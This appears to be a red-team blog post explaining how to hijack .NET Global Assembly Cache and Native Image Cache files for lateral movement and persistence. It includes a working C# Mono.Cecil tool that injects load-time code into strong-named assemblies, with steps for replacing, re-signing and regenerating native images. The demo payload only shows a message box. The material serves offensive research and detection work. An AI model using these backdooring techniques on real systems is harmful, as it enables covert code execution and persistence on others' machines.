@@ -1,0 +1,554 @@
+# https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/
+
+<!DOCTYPE html><html lang="en-GB">
+<body class="wp-singular post-template-default single single-post postid-495 single-format-standard wp-theme-retro-blog no-sidebar">
+
+
+<!--Loader-->
+<div id="preloader" style="display: none;">
+    <div class="loader">
+        <div class="dot dot-1"></div>
+        <div class="dot dot-2"></div>
+        <div class="dot dot-3"></div>
+    </div>
+    <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+        <defs>
+            <filter id="flubber">
+                <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur"></feGaussianBlur>
+                <feColorMatrix in="blur" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 21 -7"></feColorMatrix>
+            </filter>
+        </defs>
+    </svg>
+</div>
+<!-- Loader end -->
+
+<div id="page" class="site">
+    <a class="skip-link screen-reader-text" href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#content">Skip to content</a>
+    
+    <div id="content" class="site-content">
+        <div class="wrapper">
+            
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+<article id="post-495" class="post-495 post type-post status-publish format-standard hentry category-red-teaming">
+                
+    
+    <div class="entry-content">
+        <h1 class="wp-block-heading" id="tldr">TLDR</h1>
+
+
+<p>.NET framework dependencies follow a different search path than traditional DLLs and don’t always follow the “first found, first loaded” rule. Two new repositories exist as part of this alternative search path: (i) the Global Assembly Cache (GAC), which stores shared .NET assemblies and helps manage versioning; (ii) the Native Image Cache (NIC), which holds precompiled assemblies to improve performance. This blog documents techniques for hijacking both the GAC and NIC for lateral movement, elevated persistence, and other nefarious (but legally authorised) things.</p>
+
+
+<h1 class="simpletoc-title">Table of Contents</h1>
+<ul class="simpletoc-list">
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#tldr">TLDR</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#prerequisite-background-information">Pre-Requisite Background Information</a>
+
+
+<ul><li>
+<a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#strong-versus-weak-named-assemblies">Strong versus Weak Named Assemblies</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#search-paths-for-assemblies">Search Paths for Assemblies</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#gac-and-nic-permissions">GAC and NIC Permissions</a>
+
+</li>
+</ul>
+</li><li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#backdooring-net-assemblies-and-strong-name-verification">Backdooring .NET Assemblies and Strong Name Verification</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#gac-hijacking">GAC Hijacking</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#nic-hijacking">NIC Hijacking</a>
+
+
+<ul><li>
+<a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#the-easy-pe-way">The Easy (PE) Way</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#the-harder-assembly-way">The Harder (Assembly) Way</a>
+
+
+<ul><li>
+<a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#local-compilation">Local Compilation</a>
+
+</li>
+<li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#remote-compilation">Remote Compilation</a>
+
+</li>
+</ul>
+</li>
+</ul>
+</li><li><a href="https://williamknowles.io/net-gac-and-nic-hijacking-for-lateral-movement/#conclusion">Conclusion</a>
+</li></ul>
+
+<h1 class="wp-block-heading" id="prerequisite-background-information">Pre-Requisite Background Information</h1>
+
+
+<p>If you're familiar with strong/weak named assemblies, .NET search paths, the GAC and the NIC, you can skip this. </p>
+
+
+
+<p>The focus of this post is specifically on .NET framework assemblies and native images.</p>
+
+
+<h2 class="wp-block-heading" id="strong-versus-weak-named-assemblies">Strong versus Weak Named Assemblies</h2>
+
+
+<p>.NET assemblies can either be strong-named or weak-named.</p>
+
+
+
+<p>A <strong>strong-named assembly</strong> has a unique identity based on its name, version, culture (i.e., region-specific information), and a public key token. The idea being that if you depend on a specific version of an assembly this is a way to ensure you load the correct version of the file. In practice, this is not entirely true, which we'll talk about later.</p>
+
+
+
+<pre class="wp-block-code"><code class="">ExampleLibrary, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</code></pre>
+
+
+
+<p>A <strong>weak-named assembly</strong> lacks this cryptographic signature and is identified only by its file name, making it easier to replace or modify but less secure and version-resilient.</p>
+
+
+
+<pre class="wp-block-code"><code class="">ExampleLibrary, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</code></pre>
+
+
+
+<p>To check the naming used by an assembly you can use PowerShell:</p>
+
+
+
+<pre class="wp-block-code"><code class="">[System.Reflection.AssemblyName]::GetAssemblyName("C:\path\ExampleLibrary.dll").FullName</code></pre>
+
+
+<h2 class="wp-block-heading" id="search-paths-for-assemblies">Search Paths for Assemblies</h2>
+
+
+<p>The search path for .NET framework dependencies is different to traditional DLLs and does <strong>not</strong> follow the "first found, first loaded" rule. Notably two new concepts are introduced:</p>
+
+
+
+<ul class="wp-block-list">
+<li><strong>Global Assembly Cache (GAC)</strong>: A system-wide repository that stores strong named assemblies. These are standard .NET assemblies (<code>*.dll</code>) placed in a structured directory hierarchy based on their strong name, version, and public key token. The locations are architecture specific (e.g., <code>GAC_32</code>, <code>GAC_64</code>, <code>GAC_MSIL</code>). An example path:</li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code class="">C:\Windows\Microsoft.NET\assembly\GAC_MSIL\TaskScheduler\v4.0_10.0.0.0__31bf3856ad364e35\TaskScheduler.dll</code></pre>
+
+
+
+<ul class="wp-block-list">
+<li><strong>Native Image Cache (NIC)</strong>: A system-wide repository that stores precompiled native images (generated by <code>ngen.exe</code>), designed to improve startup speed by bypassing just-in-time compilation. These are completely different binaries (<code>*.ni.dll</code>) again placed in a structured directory hierarchy. The locations are architecture specific (e.g., <code>NativeImages_v4.0.30319_32</code>, *<code>_64</code>, *<code>_ARM64</code>). Note that MSIL is missing from these examples; in this case the MSIL assembly gets converted into a hardware-specific image. An example path:</li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code class="">C:\Windows\assembly\NativeImages_v4.0.30319_64\TaskScheduler\b1de85d83169a17b37448b4e3252d4a7\TaskScheduler.ni.dll</code></pre>
+
+
+
+<p>Both <strong>the GAC and NIC are optional</strong>, and .NET assemblies can be included in none, one or both.</p>
+
+
+
+<p>As part of the search path, the GAC is checked first, then the NIC, then other paths; however, that's <strong>not</strong> necessarily indicative of which file gets loaded first. It is <strong>not first found, first loaded</strong> like traditional DLLs. Instead the <strong>load</strong> priority appears to be:</p>
+
+
+
+<ol class="wp-block-list">
+<li>If the native image exists then this file is always loaded first.</li>
+
+
+
+<li>If the GAC exists then this is loaded.</li>
+
+
+
+<li>Other paths are checked (application folder, probing paths, etc).</li>
+</ol>
+
+
+
+<p>This is an important concept to understand, as the GAC and the NIC <strong>take priority even over assemblies in the same directory as your application</strong>.</p>
+
+
+
+<p>An example of this is shown below in Procmon for the loading of <code>TaskScheduler.dll</code> by <code>mmc.exe</code>. Although the GAC is checked first, as the native image exists (<code>TaskScheduler.ni.dll</code>), this is what is actually loaded.</p>
+
+
+
+<figure class="wp-block-image size-large"><img fetchpriority="high" decoding="async" width="1024" height="584" src="https://williamknowles.io/wp-content/uploads/2025/04/image-1024x584.png" alt="" class="wp-image-497"></figure>
+
+
+<h2 class="wp-block-heading" id="gac-and-nic-permissions">GAC and NIC Permissions</h2>
+
+
+<p>Files and folders in the GAC and NIC can be modified by members of the local <code>Administrators</code> group.</p>
+
+
+
+<p>Example GAC permissions:</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="393" src="https://williamknowles.io/wp-content/uploads/2025/04/image-1-1024x393.png" alt="" class="wp-image-498"></figure>
+
+
+
+<p>Example NIC permissions:</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="386" src="https://williamknowles.io/wp-content/uploads/2025/04/image-2-1024x386.png" alt="" class="wp-image-499"></figure>
+
+
+<h1 class="wp-block-heading" id="backdooring-net-assemblies-and-strong-name-verification">Backdooring .NET Assemblies and Strong Name Verification</h1>
+
+
+<p>There's some great prior research in the area of modifying existing .NET assemblies. Notable shout outs to:</p>
+
+
+
+<ul class="wp-block-list">
+<li>@guitmz: <a href="https://www.guitmz.com/net-injection-cecil/">https://www.guitmz.com/net-injection-cecil/</a></li>
+
+
+
+<li>@<em>xpn</em>: <a href="https://blog.xpnsec.com/building-modifying-packing-devops/">https://blog.xpnsec.com/building-modifying-packing-devops/</a></li>
+</ul>
+
+
+
+<p>Both blogs talk about using Cecil to modify an existing .NET assembly, and are strongly recommended reads.</p>
+
+
+
+<p>A handy thing about this approach is that if the assembly for modification has a <strong>strong name</strong> then this name <strong>does not change</strong>. The <strong>verification</strong> of the strong name however <strong>will fail</strong>.</p>
+
+
+
+<p>Does that matter? A lot of the time no. As long as the strong name matches, the assembly will get loaded. Heck, even a lot of legitimate assemblies fail strong name verification, including some from Microsoft. Here's one of many examples:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="215" src="https://williamknowles.io/wp-content/uploads/2025/04/image-3-1024x215.png" alt="" class="wp-image-500"></figure>
+
+
+
+<p>If an assembly fails strong name verification it is <strong>not possible</strong> for it to be added to the GAC or NIC using Microsoft tooling. An example of this is shown below for an assembly that I modified. The GAC addition (using <code>gacutil.exe /i</code>) and NIC addition (using <code>ngen.exe install</code>) fails as the strong name could not be verified.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="296" src="https://williamknowles.io/wp-content/uploads/2025/04/image-4-1024x296.png" alt="" class="wp-image-501"></figure>
+
+
+
+<p>This isn't really a notable barrier to prevent abuse though and the limitations of strong naming is acknowledged by Microsoft:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="192" src="https://williamknowles.io/wp-content/uploads/2025/04/image-16-1024x192.png" alt="" class="wp-image-523"></figure>
+
+
+<h1 class="wp-block-heading" id="gac-hijacking">GAC Hijacking</h1>
+
+
+<p>This approach involves taking the existing .NET assembly in the GAC, modifying it (<strong>without</strong> re-signing it), then replacing the assembly in the GAC. Strong name verification will fail, but the assembly will still be loaded without issues.</p>
+
+
+
+<p>One major factor to the success of this technique is whether there's a native image for this .NET assembly in the NIC. If a native image exists then the modified GAC assembly will <strong>NOT</strong> be loaded (as the native image will be loaded instead). For a lot of default Microsoft assemblies this will be the case. You have a couple of options here:</p>
+
+
+
+<ol class="wp-block-list">
+<li>Delete the native image. This might have performance implications.</li>
+
+
+
+<li>Target something that's in the GAC but does not have a native image in the NIC. That's quite easy to check. Just do a directory listing of the NIC and see if the associated <code>*.ni.dll</code> file exists. If it doesn't exist, you're good to go.</li>
+</ol>
+
+
+
+<p>In the following example we'll target <code>MIGUIControls.dll</code> which is loaded by the Task Scheduler snap-in for <code>mmc.exe</code>. This <strong>does</strong> have a native image by default. For simplicity for this post I'll take the route of deleting it (remotely as part of the attack flow) to prevent it from being loaded over our GAC assembly.</p>
+
+
+
+<p>Step one is to grab the correct version of the assembly from the remote system.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="254" src="https://williamknowles.io/wp-content/uploads/2025/04/image-5-1024x254.png" alt="" class="wp-image-502"></figure>
+
+
+
+<p>Next is to modify the assembly. I've provided a helper C# POC for this below. When compiling target .NET framework 4.7.2 and install the <code>Mono.Cecil</code> Nuget package. Big shout out again to the blogs mentioned in the prior research which this is based on (@guitmz, @<em>xpn</em>). To keep things simple this adds a module initialiser to the assembly, which on assembly load spawns <code>msg.exe</code> to generate a MessageBox. I'll leave OPSEC weaponisation to the reader.</p>
+
+
+
+<pre class="wp-block-code"><code class="">using Mono.Cecil;
+using Mono.Cecil.Cil;
+using System;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+
+namespace MinimalPOC
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length &lt; 2)
+            {
+                Console.WriteLine("Usage: MinimalPOC &lt;inputPath&gt; &lt;outputPath&gt; [snkPath]");
+                return;
+            }
+            string inputPath = args[0];
+            string outputPath = args[1];
+            string snkPath = args.Length &gt;= 3 ? args[2] : null;
+
+            var assembly = AssemblyDefinition.ReadAssembly(inputPath, new ReaderParameters { ReadWrite = true });
+            var moduleType = assembly.MainModule.Types.FirstOrDefault(t =&gt; t.Name == "&lt;Module&gt;");
+            if (moduleType == null)
+            {
+                Console.WriteLine("[-] &lt;Module&gt; type not found.");
+                return;
+            }
+            var cctor = moduleType.Methods.FirstOrDefault(m =&gt; m.Name == ".cctor");
+            if (cctor == null)
+            {
+                cctor = new MethodDefinition(".cctor",
+                                              Mono.Cecil.MethodAttributes.Private |
+                                              Mono.Cecil.MethodAttributes.HideBySig |
+                                              Mono.Cecil.MethodAttributes.Static |
+                                              Mono.Cecil.MethodAttributes.SpecialName |
+                                              Mono.Cecil.MethodAttributes.RTSpecialName,
+                                              assembly.MainModule.TypeSystem.Void
+                                              );
+                moduleType.Methods.Add(cctor);
+            }
+            else
+            {
+                Console.WriteLine("[-] Module initializer already exists.");
+                return;
+            }
+
+            var il = cctor.Body.GetILProcessor();
+            il.Body.Variables.Clear();
+            il.Body.Instructions.Clear();
+
+            var startRef = assembly.MainModule.ImportReference(
+                typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string), typeof(string) })
+            );
+
+            il.Append(il.Create(OpCodes.Nop));
+            il.Append(il.Create(OpCodes.Ldstr, @"C:\Windows\System32\msg.exe"));
+            il.Append(il.Create(OpCodes.Ldstr, "* \"Flow hijacked\""));
+            il.Append(il.Create(OpCodes.Call, startRef));
+            il.Append(il.Create(OpCodes.Pop));
+            il.Append(il.Create(OpCodes.Ret));
+
+            Console.WriteLine("[*] Injected IL.");
+
+            if (string.IsNullOrEmpty(snkPath))
+            {
+                assembly.Write(outputPath);
+            }
+            else
+            {
+                Console.WriteLine("[*] Re-signing assembly");
+                var keyPairBytes = File.ReadAllBytes(snkPath);
+                var writerParams = new WriterParameters
+                {
+                    StrongNameKeyPair = new StrongNameKeyPair(keyPairBytes)
+                };
+                assembly.Write(outputPath, writerParams);
+            }
+            Console.WriteLine($"[*] Assembly written to: {outputPath}");
+        }
+    }
+}</code></pre>
+
+
+
+<p>Run this with two arguments: the original (legitimate) file and the output path of the modified assembly. Ignore the third argument for now (that's used later in NIC hijacking). We can see that the strong name is identical for the modified assembly.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="283" src="https://williamknowles.io/wp-content/uploads/2025/04/image-6-1024x283.png" alt="" class="wp-image-503"></figure>
+
+
+
+<p>Now upload this to the system system, replacing the original file in the GAC. Then delete the associated native image folder.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="203" src="https://williamknowles.io/wp-content/uploads/2025/04/image-7-1024x203.png" alt="" class="wp-image-504"></figure>
+
+
+
+<p>Open Task Scheduler and we get code execution.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="414" src="https://williamknowles.io/wp-content/uploads/2025/04/image-8-1024x414.png" alt="" class="wp-image-505"></figure>
+
+
+<h1 class="wp-block-heading" id="nic-hijacking">NIC Hijacking</h1>
+
+
+<p>This approach involves modifying the native image file (<code>*.ni.dll</code>) on the remote system.</p>
+
+
+
+<p>As a native image is loaded with the highest priority during dependency resolution, it's a highly effective way to get malicious code execution. Below I document two ways to approach this.</p>
+
+
+<h2 class="wp-block-heading" id="the-easy-pe-way">The Easy (PE) Way</h2>
+
+
+<p>The approach is almost too simple. Find a remote native image, download it, modify it like a standard PE backdoor, reupload it, wait for a program to load it. </p>
+
+
+
+<p>As native images are dynamically generated for each particular system there's no digital signatures to bypass, and curiously, no integrity verification. There's not much to it.</p>
+
+
+
+<p>One major warning to this is make sure your PE backdoor continues to execute the legitimate code, otherwise you're going to break remote applications loading this native image.</p>
+
+
+
+<p>Here's an example where I've added some PIC shellcode to spawn a MessageBox to <code>TaskScheduler.ni.dll</code> (using a non-public tool but there's many publicly available).</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="365" src="https://williamknowles.io/wp-content/uploads/2025/04/image-9-1024x365.png" alt="" class="wp-image-506"></figure>
+
+
+
+<p>When the Task Scheduler snap-in is loaded on the remote system, the modified native image gets loaded, the shellcode executes, and the MessageBox is displayed.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="516" src="https://williamknowles.io/wp-content/uploads/2025/04/image-10-1024x516.png" alt="" class="wp-image-507"></figure>
+
+
+
+<p>When writing this post I realised a similar technique was used in the UAC bypass by <a href="https://github.com/AzAgarampur/byeintegrity-uac" data-type="link" data-id="https://github.com/AzAgarampur/byeintegrity-uac">@axagarampur</a>. I'm surprised it didn't get much traction for other uses.</p>
+
+
+<h2 class="wp-block-heading" id="the-harder-assembly-way">The Harder (Assembly) Way</h2>
+
+
+<p>What if you want to modify the original .NET assembly rather than the native image? You need to get the original assembly from which the native image was generated, modify that, generate a new native image, then replace the target native image on the target.</p>
+
+
+<h3 class="wp-block-heading" id="local-compilation">Local Compilation</h3>
+
+
+<p>Modifying the .NET assembly is the easy part. Getting a working native image is not as straightforward. Practically you'd ideally want to generate the native image locally/offline (i.e., outside of the target environment); however, I found that these native images are not super reliable. It works - sometimes.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="400" height="470" src="https://williamknowles.io/wp-content/uploads/2025/04/image-11.png" alt="" class="wp-image-508"></figure>
+
+
+
+<p>It seems quite sensitive to system-specific information to get a working native image. When it doesn't work, it's thankfully non-fatal and it just doesn't get loaded. It's easier to just go the PE modification route.</p>
+
+
+<h3 class="wp-block-heading" id="remote-compilation">Remote Compilation</h3>
+
+
+<p>One alternative but 100% reliable way which I'm only really including for completeness would be to generate the native image on the target system.</p>
+
+
+
+<p>The interesting part of this is that as I mentioned earlier if the strong name validation fails, then native image generation fails. So the workaround is to <strong>re-sign</strong> your modified .NET assembly. When you generate the native image it's now done on an assembly with a valid signature. Then you can use the newly compiled native image (with the incorrect strong name) to replace the original one (with the correct strong name). Again, it works, and no verification.</p>
+
+
+
+<p>If you want to test this using the C# shown earlier first (locally) generate an SNK file for signing.</p>
+
+
+
+<pre class="wp-block-code"><code class="">&amp; "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\sn.exe" -k "C:\temp\modified\mykey.snk"</code></pre>
+
+
+
+<p>Run the C# code from earlier but now passing a third argument of the path to the SNK. It will generate the assembly with an entirely new strong name. In this example we're again targeting <code>MIGUIControls.dll</code>.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="197" src="https://williamknowles.io/wp-content/uploads/2025/04/image-12-1024x197.png" alt="" class="wp-image-509"></figure>
+
+
+
+<p>This is still only the .NET assembly. Copy it to the remote (target) system, and remotely execute <code>ngen.exe</code> to generate the native image.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="313" src="https://williamknowles.io/wp-content/uploads/2025/04/image-13-1024x313.png" alt="" class="wp-image-510"></figure>
+
+
+
+<p>Now overwrite the original native image with the newly generated one.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="572" src="https://williamknowles.io/wp-content/uploads/2025/04/image-14-1024x572.png" alt="" class="wp-image-511"></figure>
+
+
+
+<p>Then opening the Task Scheduler gives us code execution again.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="526" src="https://williamknowles.io/wp-content/uploads/2025/04/image-15-1024x526.png" alt="" class="wp-image-512"></figure>
+
+
+<h1 class="wp-block-heading" id="conclusion">Conclusion</h1>
+
+
+<p>Hijacking/backdooring the .NET framework GAC or NIC is an interesting way to get your code loaded into applications that already exist on a remote system.</p>
+
+
+
+<p>It's also a great way to dechain the upload from the execution. There's lots of .NET assemblies that get executed all of the time. Just upload and wait. I'll leave that up to the reader to identify those.</p>
+    </div>
+    	<!-- .entry-footer --></article><!-- #post-## -->
+	
+		</main>
+	</div>
+</div>
+</div>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html><!-- Page cached by LiteSpeed Cache 7.1 on 2026-02-11 21:52:11 -->
